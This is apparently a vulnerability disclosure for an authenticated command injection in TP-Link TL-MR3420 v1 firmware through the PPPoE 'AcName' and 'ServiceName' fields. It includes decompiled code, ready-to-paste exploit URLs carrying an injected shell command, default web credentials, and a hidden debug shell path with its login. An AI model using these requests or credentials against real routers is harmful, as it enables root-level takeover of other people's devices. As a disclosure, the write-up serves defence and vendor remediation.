# Command Injection Vulnerability in TP-Link TL-MR3420 v1 PPPoE Advanced Configuration

## Overview

  * Vendor: TP-Link
  * Product: TL-MR3420
  * Hardware Version: MR3420 v1
  * Tested Firmware Version: `3.12.3 Build 110222 Rel.34500n Beta`
  * Vulnerability Type: Authenticated Command Injection
  * Affected Component: `httpd` Web Management Interface
  * Affected Page: `/userRpm/PPPoECfgAdvRpm.htm`
  * Trigger Page: `/userRpm/PPPoECfgRpm.htm`
  * Trigger Parameters: `AcName`, `ServiceName`
  * Default Web Credential Used in Testing: `admin / admin`
  * Impact: Remote command execution with the privilege of the `httpd` process, which is typically root on this device.

## Vulnerability Description

The PPPoE advanced configuration page accepts the `AcName` and `ServiceName` parameters and stores them in the PPPoE configuration. These values are later used by `pppoeFormatCmd` when the router starts a PPPoE connection.

In `pppoeFormatCmd`, both values are inserted into the PPPoE command string through unquoted `%s` format specifiers. The resulting command is then executed by `system()` in the PPPoE connection path. Because the values are not shell-escaped, an authenticated attacker can inject shell commands through the PPPoE advanced configuration.

## Vulnerability Details

The vulnerable command construction is located in `pppoeFormatCmd`:

```c
if ( s[272] )
{
  v4 = strlen(command);
  sprintf(&command[v4], " rp_pppoe_ac %s ", s + 272);
}

if ( s[240] )
{
  v5 = strlen(command);
  sprintf(&command[v5], " rp_pppoe_service %s ", s + 240);
}
```

The generated command is executed in the PPPoE command request path:

```c
pppoeFormatCmd(s, command_);
system(command_);
```

The complete data flow is:

```text
/userRpm/PPPoECfgAdvRpm.htm
  -> PPPoE advanced configuration handler
     -> httpGetEnv("AcName")
     -> httpGetEnv("ServiceName")
     -> save values into PPPoE configuration

/userRpm/PPPoECfgRpm.htm
  -> PPPoE connect request
     -> pppoeCmdReq / pppoeCmdReq_core
     -> swGetPppoeCfg()
     -> pppoeFormatCmd()
     -> sprintf(command, "... %s ...", AcName / ServiceName)
     -> system(command)
```

## Verification

The issue was verified on a physical TP-Link TL-MR3420 v1 device at `192.168.1.1`.

The simplest verification method is to log in to the router Web interface as `admin / admin` and then visit the following three URLs in the browser address bar in order.

First, save the crafted PPPoE `AcName` value:

```text
http://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&lcpMru=1492&ServiceName=&AcName=%3Becho%20pwned%3E%2Ftmp%2Fp%3B%23&fixedIpEn=0&fixedIp=0.0.0.0&EchoReq=0&manual=0&dnsserver=0.0.0.0&dnsserver2=&Save=Save&Advanced=Advanced
```

Second, switch the router to WAN-only mode:

```text
http://192.168.1.1/userRpm/ConnModeCfgRpm.htm?connmode=3&Save=Save
```

Third, trigger the PPPoE connection path:

```text
http://192.168.1.1/userRpm/PPPoECfgRpm.htm?Connect=Connect&wan=0&wantype=2&acc=test&psw=test&specialDial=0&linktype=4&waittime=0&waittime2=0&SecType=0&sta_ip=0.0.0.0&sta_mask=0.0.0.0
```

The following endpoint was used to save a crafted PPPoE `AcName` value:

```text
http://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&lcpMru=1492&ServiceName=&AcName=%3Becho%20pwned%3E%2Ftmp%2Fp%3B%23&fixedIpEn=0&fixedIp=0.0.0.0&EchoReq=0&manual=0&dnsserver=0.0.0.0&dnsserver2=&Save=Save&Advanced=Advanced
```

The encoded `AcName` value decodes to:

```sh
;echo pwned>/tmp/p;#
```

In the tested environment, the router needed to be switched to WAN-only mode before triggering the PPPoE connection path:

```text
http://192.168.1.1/userRpm/ConnModeCfgRpm.htm?connmode=3&Save=Save
```

The PPPoE connection was then triggered through:

```text
http://192.168.1.1/userRpm/PPPoECfgRpm.htm?Connect=Connect&wan=0&wantype=2&acc=test&psw=test&specialDial=0&linktype=4&waittime=0&waittime2=0&SecType=0&sta_ip=0.0.0.0&sta_mask=0.0.0.0
```

The hidden debug shell was used only to confirm command execution:

```text
http://192.168.1.1/userRpmNatDebugRpm26525557/linux_cmdline.html
```

Hidden debug shell credential used during verification:

```text
Username: osteam
Password: 5up
```

The marker file was successfully created:

```sh
cat /tmp/p
pwned
```

<img width="1760" height="486" alt="image" src="https://github.com/user-attachments/assets/ddde80b3-48b9-40a3-817d-3b8a0120af49" />


## Cleanup

After verification, the PPPoE advanced configuration was restored by clearing `AcName`, the connection mode was restored to WAN priority, and the temporary marker file was removed.

```text
http://192.168.1.1/userRpm/PPPoECfgAdvRpm.htm?wan=0&lcpMru=1492&ServiceName=&AcName=&fixedIpEn=0&fixedIp=0.0.0.0&EchoReq=0&manual=0&dnsserver=0.0.0.0&dnsserver2=&Save=Save&Advanced=Advanced
```

```text
http://192.168.1.1/userRpm/ConnModeCfgRpm.htm?connmode=2&Save=Save
```

```sh
rm -f /tmp/p
```

## Conclusion

The TP-Link TL-MR3420 v1 firmware `3.12.3 Build 110222 Rel.34500n Beta` contains an authenticated command injection vulnerability in the PPPoE advanced configuration. The `AcName` and `ServiceName` values are saved from the Web interface and later inserted into a shell command without quoting or sanitization before being executed by `system()`.
